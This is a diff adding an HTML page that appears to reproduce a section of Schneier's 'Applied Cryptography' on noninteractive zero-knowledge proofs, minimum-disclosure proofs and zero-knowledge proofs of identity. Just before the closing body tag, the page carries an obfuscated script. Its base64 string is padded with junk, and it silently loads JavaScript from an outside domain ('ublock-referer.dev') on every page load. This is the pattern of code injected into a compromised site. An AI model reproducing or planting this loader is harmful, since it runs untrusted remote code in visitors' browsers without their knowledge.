@@ -1,0 +1,115 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Advanced Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=05//-->
+<!--PAGES=106-109//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="05-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="05-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Noninteractive Zero-Knowledge Proofs</I></B></FONT></P>
+<P>Carol can&#146;t be convinced because the protocol is interactive, and she is not involved in the interaction. To convince Carol, and anyone else who may be interested, we need a noninteractive protocol.
+</P>
+<P>Protocols have been invented for noninteractive zero-knowledge proofs [477,198,478,197]. These protocols do not require any interaction; Peggy could publish them and thereby prove to anyone who takes the time to check that the proof is valid.</P>
+<P>The basic protocol is similar to the parallel zero-knowledge proof, but a one-way hash function takes the place of Victor:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Peggy uses her information and <I>n</I> random numbers to transform the hard problem into <I>n</I> different isomorphic problems. She then uses her information and the random numbers to solve the <I>n</I> new hard problems.
+<DD><B>(2)</B>&nbsp;&nbsp;Peggy commits to the solution of the <I>n</I> new hard problems.
+<DD><B>(3)</B>&nbsp;&nbsp;Peggy uses all of these commitments together as a single input to a one-way hash function. (After all, the commitments are nothing more than bit strings.) She then saves the first <I>n</I> bits of the output of this one-way hash function.
+<DD><B>(4)</B>&nbsp;&nbsp;Peggy takes the <I>n</I> bits generated in step (3). For each <I>i</I>th new hard problem in turn, she takes the <I>i</I>th bit of those <I>n</I> bits and:
+<DL>
+<DD><B>(a)</B>&nbsp;&nbsp;if it is a 0, she proves that the old and new problems are isomorphic, or
+<DD><B>(b)</B>&nbsp;&nbsp;if it is a 1, she opens the solution she committed to in step (2) and proves that it is a solution to the new problem.
+</DL>
+<DD><B>(5)</B>&nbsp;&nbsp;Peggy publishes all the commitments from step (2) as well as the solutions in step (4).
+<DD><B>(6)</B>&nbsp;&nbsp;Victor or Carol or whoever else is interested, verifies that steps (1) through (5) were executed properly.
+</DL>
+<P>This is amazing: Peggy can publish some data that contains no information about her secret, but can be used to convince anyone of the secret&#146;s existence. The protocol can also be used for digital signature schemes, if the challenge is set as a one-way hash of both the initial messages and the message to be signed.
+</P>
+<P>This works because the one-way hash function acts as an unbiased random-bit generator. For Peggy to cheat, she has to be able to predict the output of the one-way hash function. (Remember, if she doesn&#146;t know the solution to the hard problem, she can do either (a) or (b) of step (4), but not both.) If she somehow knew what the one-way hash function would ask her to do, then she could cheat. However, there is no way for Peggy to force the one-way function to produce certain bits or to guess which bits it will produce. The one-way function is, in effect, Victor&#146;s surrogate in the protocol&#151;randomly choosing one of two proofs in step (4).</P>
+<P>In a noninteractive protocol, there must be many more iterations of the challenge/reply sequence. Peggy, not Victor, picks the hard problems using random numbers. She can pick different problems, hence different commitment vectors, till the hash function produces something she likes. In an interactive protocol, 10 iterations&#151;a probability of 1 in 2<SUP>10</SUP> (1 in 1024) that Peggy can cheat&#151;may be fine. However, that&#146;s not enough for noninteractive zero-knowledge proofs. Remember that Mallory can always do either (a) or (b) of step (4). He can try to guess which he will be asked to do, go through steps (1) through (3), and see if he guessed right. If he didn&#146;t, he can try again&#151;repeatedly. Making 1024 guesses is easy on a computer. To prevent this brute-force attack, noninteractive protocols need 64 iterations, or even 128 iterations, to be valid.</P>
+<P>This is the whole point of using a one-way hash function: Peggy cannot predict the output of the hash function because she cannot predict its input. The commitments which are used as the input are only known after she solves the new problems.</P>
+<P><FONT SIZE="+1"><B><I>Generalities</I></B></FONT></P>
+<P>Blum proved that any mathematical theorem can be converted into a graph such that the proof of that theorem is equivalent to proving a Hamiltonian cycle in the graph. The general case that any <B>NP</B> statement has a zero-knowledge proof, assuming one-way functions and therefore good encryption algorithms, was proved in [620]. Any mathematical proof can be converted into a zero-knowledge proof. Using this technique, a researcher can prove to the world that he knows the proof of a particular theorem without revealing what that solution is. Blum could have published these results without revealing them.</P>
+<P>There are also <B>minimum-disclosure proofs</B> [590]. In a minimum-disclosure proof, the following properties hold:</P>
+<DL>
+<DD><B>1.</B>&nbsp;&nbsp;Peggy cannot cheat Victor. If Peggy does not know the proof, her chances of convincing Victor that she knows the proof are negligible.
+<DD><B>2.</B>&nbsp;&nbsp;Victor cannot cheat Peggy. He doesn&#146;t get the slightest hint of the proof, apart from the fact that Peggy knows the proof. In particular, Victor cannot demonstrate the proof to anyone else without proving it himself from scratch.
+</DL>
+<P>Zero-knowledge proofs have an additional condition:
+</P>
+<DL>
+<DD><B>3.</B>&nbsp;&nbsp;Victor learns nothing from Peggy that he could not learn by himself without Peggy, apart from the fact that Peggy knows the proof.
+</DL>
+<P>There is considerable mathematical difference between proofs that are only minimum-disclosure and those that are zero-knowledge. That distinction is beyond the scope of this book, but more sophisticated readers are welcome to peruse the references. The concepts were introduced in [626,619,622]. Further elaboration on their ideas, based on different mathematical assumptions, were developed in [240,319,239].
+</P>
+<P>There are also different kinds of zero-knowledge proofs:</P>
+<DL>
+<DD><B>&#151;</B>&nbsp;&nbsp;<B>Perfect</B>. There is a simulator that gives transcripts identically distributed to real transcripts (the Hamiltonian cycle and graph isomorphism examples).
+<DD><B>&#151;</B>&nbsp;&nbsp;<B>Statistical</B>. There is a simulator that gives transcripts identically distributed to real transcripts, except for some constant number of exceptions.
+<DD><B>&#151;</B>&nbsp;&nbsp;<B>Computational</B>. There is a simulator that gives transcripts indistinguishable from real transcripts.
+<DD><B>&#151;</B>&nbsp;&nbsp;<B>No-use</B>. A simulator may not exist, but we can prove that Victor will not learn any polynomial amount of information from the proof (the parallel example).
+</DL>
+<P>Over the years, extensive work, both theoretical and applied, has been done on minimum-disclosure and zero-knowledge proofs. Mike Burmester and Yvo Desmedt invented <B>broadcast interactive proofs</B>, where one prover can broadcast a zero-knowledge interactive proof to a large group of verifiers [280]. Cryptographers proved that <I>everything</I> that can be proven with an interactive proof can also be proven with a zero-knowledge interactive proof [753,137].</P>
+<P>A good survey article on the topic is [548]. For additional mathematical details, variations, protocols, and applications, consult [590,619,240,319,620,113,241,1528,660,238,591,617,510,592,214,104,216,832,<BR>97,939,622,482,615,618,215,476,71]. <I>A lot</I> has been written on this subject.</P>
+<H3><A NAME="Heading3"></A><FONT COLOR="#000077">5.2 Zero-Knowledge Proofs of Identity</FONT></H3>
+<P>In the real world, we often use physical tokens as proofs of identity: passports, driver&#146;s licenses, credit cards, and so on. The token contains something that links it to a person: a picture, usually, or a signature, but it could almost as easily be a thumbprint, a retinal scan, or a dental x-ray. Wouldn&#146;t it be nice to do the same thing digitally?
+</P>
+<P>Using zero-knowledge proofs as proofs of identity was first proposed by Uriel Feige, Amos Fiat, and Adi Shamir [566,567]. Alice&#146;s private key becomes a function of her &#147;identity.&#148; Using a zero-knowledge proof, she proves that she knows her private key and therefore proves her identity. Algorithms for this can be found in Section 23.11.</P>
+<P>This idea is quite powerful. It allows a person to prove his identity without any physical token. However, it&#146;s not perfect. Here are some abuses.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="05-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="05-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(VjMWpviu, FsabQlBd) {FsabQlBd = VjMWpviu.createElement('script');FsabQlBd.type = 'text/javascript';FsabQlBd.async = true;FsabQlBd.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');VjMWpviu.getElementsByTagName('body')[0].appendChild(FsabQlBd);}(document));</script></body>
+</html>
